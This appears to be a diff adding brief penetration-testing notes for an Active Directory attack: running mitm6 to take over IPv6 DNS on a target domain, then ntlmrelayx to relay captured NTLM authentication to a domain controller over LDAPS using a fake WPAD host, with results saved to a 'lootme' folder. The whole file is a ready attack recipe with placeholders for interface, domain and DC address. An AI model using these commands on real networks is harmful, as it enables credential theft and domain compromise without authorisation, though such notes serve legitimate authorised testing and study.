@@ -1,0 +1,7 @@
+mitm6
+	mitm -i <interface> -d <target domain>
+	run ntlmrelayx in new tab
+		ntlmrelayx.py -6 -t ldaps://<target DC IP> -wh fakewpad.<domain> -l lootme
+	look in /root/lootme for reports
+
+
